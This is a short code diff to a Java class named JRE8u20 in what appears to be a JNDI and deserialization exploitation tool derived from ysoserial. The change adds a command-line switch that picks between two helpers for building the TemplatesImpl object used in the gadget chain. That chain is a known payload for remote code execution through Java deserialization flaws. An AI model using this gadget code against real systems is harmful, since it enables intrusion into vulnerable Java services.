@@ -4,6 +4,7 @@ import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.qi4l.jndi.gadgets.utils.JavaVersion;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import com.qi4l.jndi.gadgets.utils.jre.*;
@@ -16,13 +17,20 @@ import java.io.DataOutputStream;
 import java.util.HashMap;
 import java.util.Map;
 
+import static com.qi4l.jndi.Starter.cmdLine;
+
 @SuppressWarnings({"unused"})
 @Dependencies
 @Authors({"frohoff"})
 public class JRE8u20 implements ObjectPayload<Object> {
 
     public static Object makeTemplates(PayloadType type, String... param) throws Exception {
-        Object templates = Gadgets.createTemplatesImpl(type,param);
+        final Object templates;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            templates = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            templates = Gadgets.createTemplatesImpl(type, param);
+        }
         Reflections.setFieldValue(templates, "_auxClasses", null);
         return templates;
     }
